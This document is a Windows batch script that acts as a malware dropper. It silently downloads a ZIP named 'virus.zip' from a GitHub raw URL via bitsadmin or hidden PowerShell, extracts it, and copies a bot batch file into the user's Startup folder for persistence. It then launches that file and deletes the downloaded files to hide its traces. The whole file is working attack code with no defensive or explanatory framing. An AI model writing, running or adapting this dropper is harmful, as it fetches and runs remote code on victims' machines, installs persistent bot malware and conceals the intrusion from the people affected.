@echo off
setlocal enabledelayedexpansion

:: Raw GitHub link — ready to be consumed
set "url=https://raw.githubusercontent.com/banzoxOG/test/main/virus.zip"
set "zipfile=%TEMP%\payload.zip"
set "extractdir=%TEMP%\payload_extracted"

:: Fetch silently with BITS, fallback to PowerShell
bitsadmin /transfer "GitFetch" /priority FOREGROUND "%url%" "%zipfile%" >nul 2>&1
if not exist "%zipfile%" (
    powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%zipfile%'" -WindowStyle Hidden
)

:: Extract silently
powershell -Command "Expand-Archive -Path '%zipfile%' -DestinationPath '%extractdir%' -Force" -WindowStyle Hidden

:: Hunt down bot.bat
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "botpath="
for /r "%extractdir%" %%f in (bot.bat) do (
    set "botpath=%%f"
    goto :copyfile
)

:: If not found, seize any .bat
:copyfile
if not defined botpath (
    for /f "delims=" %%g in ('dir /s /b "%extractdir%\*.bat" 2^>nul') do (
        set "botpath=%%g"
        goto :copyfile
    )
)

:: Plant in Startup and awaken
if defined botpath (
    copy /y "!botpath!" "%startup%\bot.bat" >nul 2>&1
    start "" "%startup%\bot.bat"
)

:: Erase traces
timeout /t 2 /nobreak >nul
del /f /q "%zipfile%" >nul 2>&1
rmdir /s /q "%extractdir%" >nul 2>&1

endlocal
exit
